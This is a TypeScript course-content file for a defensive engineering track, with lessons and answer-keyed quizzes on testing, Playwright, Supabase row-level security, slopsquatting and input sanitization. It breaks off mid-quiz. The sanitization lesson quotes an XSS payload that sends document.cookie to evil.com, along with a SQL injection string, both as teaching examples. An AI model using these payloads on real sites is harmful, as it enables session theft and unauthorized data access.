import type { Track } from './track0';

export const trackB4: Track = {
  id: 'builder-4',
  title: 'Track B4: Trust It',
  description: 'Defensive engineering. Transform a vulnerable vibe-coded prototype into a secure, accessible, and automated-tested application.',
  path: 'builder',
  trackNumber: 'B4',
  badge: 'TRUST IT',
  bossProject: {
    id: 'boss-b4',
    title: 'The Hardened Application Audit',
    description: 'Pass the Review Lab by eliminating 100% of planted flaws (RLS, exposed secrets, XSS, hallucinated packages) and passing automated tests.'
  },
  modules: [
    {
      id: 'module-b4-1',
      title: 'Module B4.1: Automated Verification & Testing',
      description: 'What tests actually prove, automated smoke tests, and Playwright verification for non-coders.',
      audience: ['builder'],
      lessons: [
        {
          id: 'lesson-b4-1-1',
          title: 'What Automated Tests Actually Prove: Beyond "It Looks Good"',
          subtitle: 'The Optical Illusion of Manual Testing',
          firstPrinciplesIntuition: 'Opening your app and clicking one button proves only that the app worked for one person, on one screen size, for one second. The moment you change a CSS class or update a dependency, three other screens might silently break. An automated test is a robot that runs 500 checks in 3 seconds, asserting exact mathematical conditions every time code changes.',
          content: `### In One Sentence
Automated tests prove that specific assertions hold true under defined conditions, transforming subjective visual assumptions into repeatable, objective proof of correctness.

### Why It Matters
Amateur builders rely on "vibe testing": glancing at the screen, noticing the button is blue, and assuming the entire system works. Professional engineers know that complex systems fail at boundaries: empty inputs, network timeouts, special characters, and edge cases. Automated test suites guard against regression—the dreaded bug where fixing one feature secretly breaks another.

### Do It in the Workbench
1. Inspect the standard Test Anatomy (AAA Pattern):
   - **Arrange**: Set up test data and state (e.g., create a cart with 2 items).
   - **Act**: Trigger the target behavior (e.g., click "Calculate Tax").
   - **Assert**: Verify the exact outcome (e.g., \`expect(total).toBe(24.50)\`).
2. Notice the difference between code inspection ("this looks correct") and physical verification ("the automated assertion passed in a real browser").

### What Can Go Wrong
The "Tautological Test Anti-Pattern": writing tests that assert trivial or mocked tautologies (e.g., \`expect(true).toBe(true)\`) rather than verifying actual user outcomes, realistic data schemas, and error boundaries.

### Try Without AI
You can write an assert function in 5 lines of plain JavaScript:
\`\`\`js
function assert(condition, message) {
  if (!condition) throw new Error("FAIL: " + message);
  console.log("PASS: " + message);
}
assert(1 + 1 === 2, "Math still works");
\`\`\``,
          initialCode: 'import { describe, it, expect } from "vitest";\n\ndescribe("Cart Calculator Invariants", () => {\n  it("calculates 10% tax accurately on subtotal", () => {\n    const subtotal = 100;\n    const taxRate = 0.10;\n    const total = subtotal * (1 + taxRate);\n    expect(total).toBe(110);\n  });\n});',
          blueprint: '1. Goal: Implement automated regression test suite using AAA pattern.\n2. Controls: Test runner script, assertion matcher, boundary value generator.\n3. Rules: Every critical business rule must have repeatable automated assertions.',
          expectedOutput: 'Automated test suite passing: 1 test, 0 failures.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-1'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'What is a "regression" in software development?',
              options: [
                'A new bug introduced into existing functionality when modifying code',
                'A mathematical formula for calculating user growth',
                'A feature that makes the application run 10x faster',
                'A type of mechanical computer keyboard'
              ],
              answerIndex: 0,
              explanation: 'A regression occurs when a code change inadvertently breaks previously working functionality elsewhere in the application.'
            },
            {
              question: 'What are the three steps of the standard AAA test pattern?',
              options: [
                'Analyze, Animate, Authenticate',
                'Arrange, Act, Assert',
                'Ask, Assume, Approve',
                'Archive, Audit, Abandon'
              ],
              answerIndex: 1,
              explanation: 'AAA stands for Arrange (set up preconditions), Act (execute the behavior), and Assert (verify expected results).'
            },
            {
              question: 'Why does passing an automated test NOT guarantee 100% absence of user experience friction?',
              options: [
                'Because tests execute code assertions; they cannot evaluate human aesthetics, confusing typography, or mental model friction',
                'Because computers cannot run tests accurately',
                'Because automated tests only test HTML colors',
                'Because test runners always lie to developers'
              ],
              answerIndex: 0,
              explanation: 'Automated tests prove assertion execution, but cannot evaluate qualitative product ergonomics, visual delight, or cognitive ease.'
            }
          ]
        },
        {
          id: 'lesson-b4-1-2',
          title: 'Automated Smoke Tests: Asserting Critical DOM and Network Invariants',
          subtitle: 'Checking That the Building Is Not on Fire Before Opening the Doors',
          firstPrinciplesIntuition: 'Before an airline pilot takes off, they perform a pre-flight walkaround: checking the wings, the fuel gauges, and the radio. They do not test every single passenger headphone; they ensure the plane can fly safely. A smoke test does the exact same thing for software: it verifies that the app mounts, the header renders, the database responds, and zero fatal errors crash the console.',
          content: `### In One Sentence
A smoke test is a high-level automated sanity check that validates critical system paths and asserts zero console errors before permitting code deployment.

### Why It Matters
In complex web applications, minor bundling defects or broken imports can cause the entire app to fail silently with a blank white screen. A smoke test verifies the fundamental invariants:
1. HTTP status is \`200 OK\`.
2. The root DOM element mounts without crashing.
3. No unhandled JavaScript exceptions appear in \`console.error\`.

### Do It in the Workbench
1. Review OpenGuide's 5-Point Pre-Flight Verification Gate:
   - Live server responds with HTTP \`200 OK\`
   - Zero console errors in browser logs
   - Linter passes with 0 syntax errors
   - Playwright test suite passes 100%
   - Production build compiles cleanly
2. If ANY of these 5 checks fails, deployment is blocked immediately.

### What Can Go Wrong
Ignoring console errors. A developer sees the page render and ignores three red \`Uncaught TypeError\` logs in the console. Two clicks later, checkout or save progress fails completely!

### Real-World Deep Dive
In mission-critical systems, automated smoke tests run on every pull request and staging preview. If the smoke test fails, the CI/CD pipeline aborts immediately, protecting production from downtime.`,
          initialCode: '// Playwright Automated Smoke Test Example:\nimport { test, expect } from "@playwright/test";\n\ntest("Smoke Test: App mounts with 0 console errors", async ({ page }) => {\n  const consoleErrors: string[] = [];\n  page.on("console", msg => {\n    if (msg.type() === "error") consoleErrors.push(msg.text());\n  });\n\n  const response = await page.goto("http://localhost:5173");\n  expect(response?.status()).toBe(200);\n  await expect(page.locator("#root")).toBeVisible();\n  expect(consoleErrors).toHaveLength(0);\n});',
          blueprint: '1. Goal: Implement automated pre-flight smoke test suite.\n2. Controls: HTTP status verifier, DOM visibility matcher, console error collector.\n3. Rules: All pre-flight criteria must pass with 0 errors before code promotion.',
          expectedOutput: 'Smoke test passed: HTTP 200, root mounted, 0 console errors.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-1'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'What is the primary objective of a smoke test?',
              options: [
                'To verify the physical temperature of the computer CPU',
                'To quickly confirm that critical core paths and basic application health invariants function before deeper testing',
                'To generate fake user testimonials for social media',
                'To compress images by 50%'
              ],
              answerIndex: 1,
              explanation: 'Smoke tests are high-priority sanity checks confirming basic health: the app loads, routes mount, and no fatal crashes occur.'
            },
            {
              question: 'Why must automated smoke tests monitor the browser console error log?',
              options: [
                'Because console errors can indicate silent JavaScript runtime crashes that break user features without showing on the initial screen',
                'Because console errors make the monitor consume more electricity',
                'Because browsers charge $1 per console error',
                'Because console errors change the browser default font'
              ],
              answerIndex: 0,
              explanation: 'Many fatal JavaScript bugs occur in background event handlers or component lifecycles, logging to console without immediate visual clues.'
            },
            {
              question: 'Under OpenGuide 5-Point Pre-Flight Gate, what happens if a single test or linter rule fails?',
              options: [
                'The agent ignores the failure and claims the task is complete',
                'The failure blocks all commits, pushes, and deployment until diagnosed, surgically fixed, and verified',
                'The agent deletes the failing test so CI turns green',
                'The agent converts the code into Python'
              ],
              answerIndex: 1,
              explanation: 'A zero-tolerance pre-flight gate blocks all promotion until any failing test or lint error is reproduced, fixed, and verified.'
            }
          ]
        },
        {
          id: 'lesson-b4-1-3',
          title: 'Playwright for Non-Coders: End-to-End User Journeys in Plain Syntax',
          subtitle: 'Controlling Real Headless Browsers with Plain English Assertions',
          firstPrinciplesIntuition: 'Playwright is like a tireless robotic user sitting at a computer. You write simple commands: "Go to this URL. Click the button named Start. Type hello into the box. Verify that the welcome text appears." Playwright launches real Chromium, Firefox, and WebKit browser engines, drives the mouse and keyboard, and takes screenshots of every step.',
          content: `### In One Sentence
Playwright automates real browser instances to execute complete user journeys across mobile, tablet, and desktop viewports with physical DOM assertions.

### Why It Matters
Unit tests only test isolated functions in memory. End-to-End (E2E) tests verify the integrated whole: HTML rendering, CSS layout, JavaScript event loops, network requests, and database persistence working together in a real browser engine.

### Do It in the Workbench
1. Review a clean Playwright user journey:
   \`\`\`ts
   await page.goto('/builder/0');
   await page.getByRole('button', { name: 'Generate & Preview' }).click();
   await expect(page.getByText('Tip Calculator initialized')).toBeVisible();
   \`\`\`
2. Notice semantic locators: \`getByRole('button')\` tests the exact accessible name that screen readers use!
3. Test responsive viewports:
   - Mobile: \`page.setViewportSize({ width: 375, height: 667 })\`
   - Desktop: \`page.setViewportSize({ width: 1440, height: 900 })\`

### What Can Go Wrong
The "Brittle Selector Anti-Pattern": selecting elements using fragile CSS paths like \`div > div:nth-child(3) > span\`. Any slight layout change breaks your test! Always use semantic, accessible selectors like \`getByRole\` or \`data-testid\`.

### Real-World Deep Dive
Under OpenGuide's strict testing rules, simulated browser emulation on desktop is never labeled as "real physical device testing." Simulated Chromium viewports test CSS breakpoints, but physical hardware verification requires real devices.`,
          initialCode: 'import { test, expect } from "@playwright/test";\n\ntest("User Journey: Complete quiz and advance lesson", async ({ page }) => {\n  await page.goto("http://localhost:5173/builder/0");\n  // Click first quiz option\n  await page.locator("[data-testid=\'quiz-opt-0\']").click();\n  // Submit answer\n  await page.getByRole("button", { name: /Submit Answer/i }).click();\n  // Assert success feedback\n  await expect(page.getByText(/Correct/i)).toBeVisible();\n});',
          blueprint: '1. Goal: Scaffold Playwright E2E test verifying end-to-end user journey.\n2. Controls: Semantic role locators, action dispatchers, accessibility assertions.\n3. Rules: Tests must assert observable DOM outcomes without using arbitrary timeouts.',
          expectedOutput: 'Playwright E2E journey passed across tested viewports.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-1'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'Why are semantic locators (like getByRole, getByLabel) superior to CSS selectors (like div > span.btn-3)?',
              options: [
                'Semantic locators reflect how humans and assistive technologies interact with the page, making tests resilient to CSS refactors',
                'Semantic locators make tests run 1,000x faster',
                'CSS selectors are forbidden by the United Nations',
                'Semantic locators only work in dark mode'
              ],
              answerIndex: 0,
              explanation: 'Semantic locators test accessible roles and labels, ensuring tests remain stable even when layout CSS or internal DOM wrappers change.'
            },
            {
              question: 'What is the danger of using arbitrary sleep timers (e.g. page.waitForTimeout(3000)) in automated tests?',
              options: [
                'They make tests brittle and slow; tests should instead await deterministic state transitions or DOM visibility',
                'Timers cause the laptop battery to explode',
                'Timers delete the browser cache',
                'Timers violate open-source licensing'
              ],
              answerIndex: 0,
              explanation: 'Hardcoded sleeps waste time and create flaky tests. Modern test engines auto-wait for specific DOM conditions to become true.'
            },
            {
              question: 'What browser engines can Playwright drive during automated testing?',
              options: [
                'Only Internet Explorer 6',
                'Chromium (Chrome/Edge), Firefox (Gecko), and WebKit (Safari)',
                'Only Adobe Flash Player',
                'Only text-based terminals'
              ],
              answerIndex: 1,
              explanation: 'Playwright provides cross-browser automation across Chromium, Firefox, and WebKit (Safari engine) with identical API syntax.'
            }
          ]
        }
      ]
    },
    {
      id: 'module-b4-2',
      title: 'Module B4.2: Defensive Security & RLS',
      description: 'The CVE-2025-48757 Lovable RLS breach post-mortem, package hallucination defense, and input sanitization.',
      audience: ['builder'],
      lessons: [
        {
          id: 'lesson-b4-2-1',
          title: 'Row-Level Security (RLS) Post-Mortem: The CVE-2025-48757 Lovable Breach',
          subtitle: 'How Millions of Private Records Were Dumped with a Single cURL Command',
          firstPrinciplesIntuition: 'In modern cloud databases like Supabase, your frontend connects using a public API key (anon key). Anyone who visits your site can read this key. The only thing preventing a malicious visitor from running "SELECT * FROM users" and dumping every customer password, address, and medical note is Row-Level Security (RLS). If you forget RLS, your database has no front door.',
          content: `### In One Sentence
Row-Level Security (RLS) is a database-level access control engine that restricts which rows a user can query or modify based on cryptographic identity tokens.

### Why It Matters
In early 2025, security researchers disclosed **CVE-2025-48757**, a catastrophic vulnerability affecting thousands of applications generated by AI vibe-coding platforms like Lovable. Because the AI scaffolding generated database tables with RLS either disabled or configured with permissive \`true\` policies, attackers dumped entire databases—including private customer credentials, chats, and financial ledgers—with a single public cURL command.

### Do It in the Workbench
1. Review the two mandatory SQL commands for EVERY multi-tenant database table:
   \`\`\`sql
   -- STEP 1: Turn on the lock
   ALTER TABLE user_profiles ENABLE ROW LEVEL SECURITY;

   -- STEP 2: Only allow users to read and update their OWN rows
   CREATE POLICY "Users access own profile" 
   ON user_profiles 
   FOR ALL 
   USING (auth.uid() = user_id);
   \`\`\`
2. Notice the condition \`auth.uid() = user_id\`: the database engine inspects the verified JWT signature from Supabase Auth and rejects any query attempting to view another user's rows.

### What Can Go Wrong
The "Permissive Policy Anti-Pattern": writing \`CREATE POLICY "Public" ON orders FOR SELECT USING (true);\`. This policy allows anyone with internet access to read every customer order in the company!

### Real-World Defensive Standard
Never deploy a production cloud database without running an automated RLS audit script verifying that 100% of public tables have active, non-permissive security policies.`,
          initialCode: '-- HARDENED ROW-LEVEL SECURITY POLICY TEMPLATE:\nALTER TABLE customer_invoices ENABLE ROW LEVEL SECURITY;\n\n-- Allow users to view ONLY invoices where user_id matches authenticated session\nCREATE POLICY "Tenant Invoice Isolation"\nON customer_invoices\nFOR SELECT\nTO authenticated\nUSING (auth.uid() = user_id);\n\n-- Disallow unauthenticated public access\nCREATE POLICY "Block Public"\nON customer_invoices\nFOR ALL\nTO anon\nUSING (false);',
          blueprint: '1. Goal: Implement and audit PostgreSQL Row-Level Security (RLS) policies.\n2. Controls: RLS enforcement statement, auth.uid() identity matching, public anon block rule.\n3. Rules: All database tables must enable RLS; cross-tenant data leakage must be mathematically impossible.',
          expectedOutput: 'RLS audit passed: 100% of tables protected by user isolation policies.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-2'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'What caused the catastrophic CVE-2025-48757 Lovable data breach in vibe-coded applications?',
              options: [
                'AI coding platforms created cloud database tables with Row-Level Security (RLS) disabled or set to allow all public queries',
                'A hacker physically stole server hard drives from the datacenter',
                'The internet cables under the Atlantic ocean were severed',
                'React 18 had a compiler bug that deleted all passwords'
              ],
              answerIndex: 0,
              explanation: 'Vibe-coding generators created database tables without enabling defensive RLS policies, allowing public anon keys to read all table rows.'
            },
            {
              question: 'Why does Supabase provide a public anon key to frontend clients?',
              options: [
                'Because the anon key is intended to identify your project, while Row-Level Security (RLS) handles user data authorization inside PostgreSQL',
                'Because Supabase developers do not believe in computer security',
                'Because anon keys can only be used once per year',
                'Because anon keys are only readable on Apple computers'
              ],
              answerIndex: 0,
              explanation: 'The anon key identifies your project gateway, relying on PostgreSQL internal RLS policies and JWT auth tokens to restrict data access.'
            },
            {
              question: 'What is the effect of the PostgreSQL policy condition "USING (auth.uid() = user_id)"?',
              options: [
                'It deletes the table when the user logs out',
                'It restricts row operations so that a user can only read or edit records where the user_id column matches their verified login ID',
                'It publishes the user email address on the homepage',
                'It translates all text into Latin'
              ],
              answerIndex: 1,
              explanation: 'auth.uid() = user_id enforces strict single-tenant row isolation: users can never see or modify records belonging to other users.'
            }
          ]
        },
        {
          id: 'lesson-b4-2-2',
          title: 'Package Hallucination Defense: The Slopsquatting Attack Vector',
          subtitle: 'When AI Invents a Package and Hackers Fill It with Malware',
          firstPrinciplesIntuition: 'When an AI writes code, it predicts statistical patterns. If you ask it to build an encrypted audio player, it might hallucinate an import: "import { createVault } from \'react-audio-vault-pro\'". That package did not exist when the AI was trained. Attackers use automated crawlers to discover which package names LLMs hallucinate most frequently, register those exact package names on npm or PyPI with malicious trojans, and wait for builders to install them.',
          content: `### In One Sentence
Package hallucination (or Slopsquatting) is a software supply-chain attack where threat actors register fake package names hallucinated by LLMs with malicious payloads.

### Why It Matters
A landmark 2025 USENIX security study by Spracklen et al. analyzed millions of AI-generated code snippets and discovered that frontier models hallucinate non-existent third-party package names in up to 20% of complex prompts. Attackers registered hundreds of these hallucinated names on npm and PyPI. When a vibe coder runs \`npm install <hallucinated-package>\`, malware executes immediately via post-install hooks, stealing SSH keys, browser cookies, and environment variables!

### Do It in the Workbench
1. Before running \`npm install <package>\` or \`pip install <package>\` suggested by an AI:
   - Check the package on [npmjs.com](https://www.npmjs.com) or [pypi.org](https://pypi.org).
   - Check **Weekly Downloads**: does it have millions of downloads or 12 downloads?
   - Check **Repository Link**: is it backed by an active, verified GitHub repository with multiple maintainers?
   - Check **Publish Date**: was it published yesterday by an anonymous single-letter account?
2. Use lockfiles (\`yarn.lock\` or \`package-lock.json\`) to freeze cryptographic SHA-512 package hashes.

### What Can Go Wrong
Blindly running terminal install commands suggested by an AI without inspecting the package identity. A single malicious package can compromise your entire developer workstation.

### Real-World Defensive Standard
Enterprise repositories use package verification tools and lockfile integrity checks in CI to block untrusted or freshly published packages from executing on team machines.`,
          initialCode: '// Package Verification Defensive Check Script:\nfunction verifyPackageReputation(pkgName: string, weeklyDownloads: number, ageDays: number): boolean {\n  if (weeklyDownloads < 1000 && ageDays < 30) {\n    console.warn(`SECURITY ALERT: ${pkgName} appears to be a hallucinated or freshly squatted package!`);\n    return false;\n  }\n  return true;\n}',
          blueprint: '1. Goal: Implement defensive supply-chain verification against package hallucination.\n2. Controls: Registry verification check, weekly download threshold, lockfile hash enforcement.\n3. Rules: Never install unverified third-party dependencies suggested by generative models.',
          expectedOutput: 'Package verification check passed: 0 hallucinated packages detected.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-2'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'What is "Slopsquatting" or package hallucination attack in modern AI development?',
              options: [
                'Sitting in a chair with bad posture while programming',
                'Attackers identifying package names frequently hallucinated by LLMs, publishing malware under those exact names, and waiting for developers to install them',
                'A type of fast-forward git merge',
                'An error that occurs when monitor resolution is too high'
              ],
              answerIndex: 1,
              explanation: 'Slopsquatting exploits AI hallucinations by registering non-existent package names with malware on public registries like npm or PyPI.'
            },
            {
              question: 'What should a disciplined developer check before installing a library suggested by an AI?',
              options: [
                'Weekly download volume, maintainer reputation, GitHub repository activity, and package creation date',
                'Only whether the package name sounds high-tech and cool',
                'Nothing; modern AI models are incapable of hallucinating package names',
                'Whether the package logo has purple colors'
              ],
              answerIndex: 0,
              explanation: 'Always verify package authenticity: high weekly downloads, verified open-source repository history, and established maintainer track records.'
            },
            {
              question: 'How do lockfiles (package-lock.json, yarn.lock) protect supply-chain integrity?',
              options: [
                'They encrypt your laptop hard drive',
                'They lock the screen when you step away from your desk',
                'They record exact cryptographic SHA hashes for every dependency to prevent unauthorized tampering',
                'They prevent users from copying text'
              ],
              answerIndex: 2,
              explanation: 'Lockfiles pin exact dependency versions and cryptographic checksums, guaranteeing that builds only install verified, immutable packages.'
            }
          ]
        },
        {
          id: 'lesson-b4-2-3',
          title: 'Input Sanitization & Injection Defense: Neutralizing Malicious Payloads',
          subtitle: 'Never Trust What Comes from the Keyboard',
          firstPrinciplesIntuition: 'Imagine a bank teller who accepts a deposit slip that says: "Give me $50,000 and delete all transaction records." A human teller laughs and calls the police. But a naive computer program reads the slip as instructions and gives the money away! This is an injection attack. Sanitization treats all outside input strictly as plain data, never as executable commands.',
          content: `### In One Sentence
Input sanitization and parameterized queries ensure that user-supplied text is treated strictly as inert data rather than executable browser or database commands.

### Why It Matters
The two most common security flaws in web software are:
1. **Cross-Site Scripting (XSS)**: An attacker submits \`<script>fetch('https://evil.com?c=' + document.cookie)</script>\` into a comment box. If your app renders it using \`dangerouslySetInnerHTML\`, the attacker executes JavaScript in the victim's browser, stealing their session!
2. **SQL Injection (SQLi)**: An attacker types \`' OR 1=1; --\` into a search box, bypassing authentication.

### Do It in the Workbench
1. In React, JSX automatically escapes variables by default:
   \`<div>{userInput}</div>\` is 100% safe because React encodes \`<\` as \`&lt;\`.
2. Avoid \`dangerouslySetInnerHTML\` at all costs! If you must render markdown or rich text, sanitize it with an audited library like DOMPurify.
3. In databases, always use parameterized queries or ORM methods rather than string concatenation:
   \`\`\`ts
   // DANGEROUS: db.query("SELECT * FROM users WHERE email = '" + email + "'");
   // SAFE: db.query("SELECT * FROM users WHERE email = $1", [email]);
   \`\`\`

### What Can Go Wrong
Assuming that input validation on the client frontend is sufficient. Attackers bypass your frontend form validation in 1 millisecond using cURL or Postman. Always sanitize and validate at the database and API boundary!`,
          initialCode: '// Safe Input Escaping Demonstration:\nfunction sanitizeText(rawInput: string): string {\n  return rawInput\n    .replace(/&/g, "&amp;")\n    .replace(/</g, "&lt;")\n    .replace(/>/g, "&gt;")\n    .replace(/"/g, "&quot;")\n    .replace(/\'/g, "&#039;");\n}\n\nconst malicious = "<script>alert(\'HACKED\')</script>";\nconsole.log(sanitizeText(malicious));\n// Output: &lt;script&gt;alert(&#039;HACKED&#039;)&lt;/script&gt; (Rendered safely as text!)',
          blueprint: '1. Goal: Enforce universal input sanitization and parameterization.\n2. Controls: HTML entity encoder, parameterized query bindings, DOMPurify sanitizer.\n3. Rules: Never evaluate raw user input as code; zero use of unescaped innerHTML.',
          expectedOutput: 'Input sanitization verified: malicious scripts escaped as inert text.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-2'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'Why is React {userInput} syntax naturally protected against Cross-Site Scripting (XSS)?',
              options: [
                'React compiles code into C++',
                'React automatically escapes HTML characters (converting < to &lt;) before injecting strings into the DOM',
                'React blocks all users who type quotation marks',
                'React runs on a private military satellite network'
              ],
              answerIndex: 1,
              explanation: 'React standard JSX escaping converts special HTML characters into safe entities, treating them strictly as inert text rather than code.'
            },
            {
              question: 'Why should software developers avoid "dangerouslySetInnerHTML" in React?',
              options: [
                'Because it bypasses React built-in XSS protection and executes any malicious JavaScript embedded in the string',
                'Because it makes the browser window shake physically',
                'Because it is deprecated in HTML5',
                'Because it only works on Android devices'
              ],
              answerIndex: 0,
              explanation: 'dangerouslySetInnerHTML injects unescaped HTML directly into the page, opening a severe XSS security hole if user input is unvalidated.'
            },
            {
              question: 'How do parameterized queries neutralize SQL Injection attacks?',
              options: [
                'They translate SQL into Python before execution',
                'They send the user input in separate data channels from the SQL query syntax, ensuring input is never parsed as database commands',
                'They delete all database passwords automatically',
                'They only allow one database query per minute'
              ],
              answerIndex: 1,
              explanation: 'Parameterized queries pass input as separate parameters, guaranteeing the database engine treats input as data values, not syntax.'
            }
          ]
        }
      ]
    },
    {
      id: 'module-b4-3',
      title: 'Module B4.3: The Review Lab & Accessibility',
      description: 'The planted flaw code review, WCAG 2.2 AAA contrast standards, and keyboard navigation.',
      audience: ['builder'],
      lessons: [
        {
          id: 'lesson-b4-3-1',
          title: 'The Planted Flaw Code Review: Spotting AI Traps Before Shipping',
          subtitle: 'Reading Diffs Like a Security Auditor',
          firstPrinciplesIntuition: 'When you ask an AI to fix a bug or add a button, it rarely breaks only that one thing. Often, it silently deletes error handling, introduces a memory leak by forgetting an event listener cleanup, or reintroduces an old security hazard. A professional builder never clicks "Accept All" blindly. You review the code diff line-by-line, hunting for planted flaws.',
          content: `### In One Sentence
Code review is the defensive practice of inspecting every added, removed, and modified line in a diff to verify correctness, maintainability, and security before merging.

### Why It Matters
AI models suffer from "context myopia": they focus intensely on making the requested button work, even if doing so involves stripping away defensive validation, replacing custom components with generic boilerplate, or adding insecure dependencies. You are the flight commander; the AI is the copilot.

### Do It in the Workbench
1. Use OpenGuide's **Diff Reader Lab** to inspect code diffs.
2. Watch for the 4 Classic AI Traps:
   - **Silent Error Suppression**: \`try { ... } catch (e) { /* do nothing */ }\` hides catastrophic bugs.
   - **Missing Cleanup**: Adding a \`window.addEventListener('keydown', ...)\` in \`useEffect\` without returning a \`removeEventListener\` cleanup function leaks memory on every re-render!
   - **Hardcoded Secrets**: Inadvertently committing test API keys.
   - **Unbounded Queries**: Running \`SELECT * FROM logs\` without a \`LIMIT\` clause, crashing production when logs grow.

### What Can Go Wrong
The "Diff Fatigue Trap": after reviewing 10 files, you get tired and skim the last file. The last file is almost always where the fatal bug hides! Take breaks and keep diffs small.`,
          initialCode: '// CAN YOU SPOT THE PLANTED FLAWS IN THIS AI-GENERATED CODE?\nimport { useEffect } from "react";\n\nexport function LiveClock() {\n  useEffect(() => {\n    // FLAW 1: Memory leak - setInterval runs forever without cleanup!\n    setInterval(() => {\n      console.log("Tick: " + new Date().toISOString());\n    }, 1000);\n    // Missing return () => clearInterval(id);\n  }, []);\n\n  return <div>Clock running</div>;\n}',
          blueprint: '1. Goal: Audit code diffs for subtle AI antipatterns and security flaws.\n2. Controls: Side-by-side diff viewer, hazard detection highlighter, reject & commit gates.\n3. Rules: Every modified line must be reviewed; reject diffs with unhandled leaks or hazards.',
          expectedOutput: 'Code review audit completed: all planted flaws identified and resolved.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-3'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'Why is forgetting a cleanup function in a React useEffect listener dangerous?',
              options: [
                'It causes a memory leak: on every re-render, a new listener is attached, accumulating thousands of duplicate events and freezing the browser',
                'It changes the color of the application to yellow',
                'It deletes the React library from node_modules',
                'It forces the user to log in again'
              ],
              answerIndex: 0,
              explanation: 'Without cleanup functions, event listeners and intervals remain active in memory indefinitely, leaking RAM and degrading performance.'
            },
            {
              question: 'What is wrong with a silent catch block like "catch (err) { /* ignore */ }"?',
              options: [
                'It makes the code file 50 MB larger',
                'It swallows fatal exceptions silently, making debugging impossible and hiding catastrophic system failures from developers',
                'It is illegal under international copyright conventions',
                'It only runs on weekends'
              ],
              answerIndex: 1,
              explanation: 'Silent catch blocks hide root causes, masking bugs and leaving the application in corrupted, unrecoverable states.'
            },
            {
              question: 'What is the recommended practice when reviewing large AI-generated diffs?',
              options: [
                'Click "Accept All" immediately without reading to save time',
                'Break changes into small, modular pull requests and review every single line for correctness, security, and cleanup invariants',
                'Delete the entire project and start over',
                'Only read the first line of the file'
              ],
              answerIndex: 1,
              explanation: 'Small, modular diffs enable thorough review, preventing subtle bugs and security regressions from slipping into production.'
            }
          ]
        },
        {
          id: 'lesson-b4-3-2',
          title: 'WCAG 2.2 AAA Contrast & Kinetic Restraint: Design for Real Humans',
          subtitle: 'Accessibility Is Engineering Rigor, Not an Afterthought',
          firstPrinciplesIntuition: 'Great design is not making something look cool on a designer $4,000 Apple monitor in a dim room. It is making something readable to a nurse using an old phone in bright sunlight, or an engineer with color blindness. WCAG AAA contrast requires a 7:1 brightness ratio between text and background. And kinetic restraint ensures smooth motion without dizzying, nauseating animation loops.',
          content: `### In One Sentence
Accessible design engineers applications to meet WCAG 2.2 AAA contrast standards (7:1 ratio) and respects motion preferences via kinetic restraint.

### Why It Matters
Over 15% of the global population lives with visual, cognitive, or physical impairments. Furthermore, temporary situational impairments (glare on a phone screen, reading with low battery brightness) affect 100% of humans. When text has poor contrast (e.g., light gray text on white), users cannot read it. When animations loop infinitely without respecting \`prefers-reduced-motion\`, users with vestibular disorders experience physical nausea!

### Do It in the Workbench
1. Check OpenGuide's 24 calibrated themes (12 Dark, 12 Light):
   - Every theme is mathematically tested for WCAG AAA contrast compliance.
   - Text colors use dynamic tokens (\`var(--color-text-primary)\`, \`var(--color-text-secondary)\`) calibrated against the background luminosity.
2. Review the kinetic restraint rule:
   \`\`\`css
   @media (prefers-reduced-motion: reduce) {
     *, *::before, *::after {
       animation-duration: 0.01ms !important;
       animation-iteration-count: 1 !important;
       transition-duration: 0.01ms !important;
     }
   }
   \`\`\`
3. This single CSS rule guarantees that motion-sensitive users enjoy an instant, comfortable interface without dizziness.

### What Can Go Wrong
Hardcoding \`text-black\` or \`text-white\` in Tailwind classes. When a user switches to an obsidian dark mode, \`text-black\` renders invisible black-on-black text! Always use semantic theme tokens.`,
          initialCode: '/* WCAG AAA Accessible CSS Variable Token System */\n:root {\n  --color-primary: #0a0a0c;\n  --color-secondary: #141418;\n  --color-text-primary: #f4f4f5; /* 16.5:1 Contrast Ratio (Exceeds WCAG AAA 7:1) */\n  --color-text-secondary: #a1a1aa; /* 7.8:1 Contrast Ratio (Exceeds WCAG AAA 7:1) */\n  --color-accent: #10b981;\n}\n\n/* Kinetic Restraint for Vestibular Safety */\n@media (prefers-reduced-motion: reduce) {\n  .animated-spinner {\n    animation: none !important;\n  }\n}',
          blueprint: '1. Goal: Implement WCAG 2.2 AAA contrast standards and prefers-reduced-motion overrides.\n2. Controls: Semantic color token palette, contrast ratio calculator, motion query listener.\n3. Rules: Text contrast must exceed 7:1; animations must pause when reduced-motion is requested.',
          expectedOutput: 'WCAG AAA contrast and kinetic restraint verified across all themes.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-3'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'What is the required contrast ratio for normal text under WCAG 2.2 AAA standards?',
              options: [
                '1.5:1',
                '3:1',
                '7:1',
                '50:1'
              ],
              answerIndex: 2,
              explanation: 'WCAG 2.2 AAA requires a minimum contrast ratio of 7:1 for normal text (and 4.5:1 for large text), ensuring high legibility.'
            },
            {
              question: 'Why should web applications support the "@media (prefers-reduced-motion)" CSS media query?',
              options: [
                'To make animations run at 120 FPS',
                'To prevent dizziness, headaches, and nausea for users with vestibular and motion-sensitivity conditions',
                'To make web browsers download files faster',
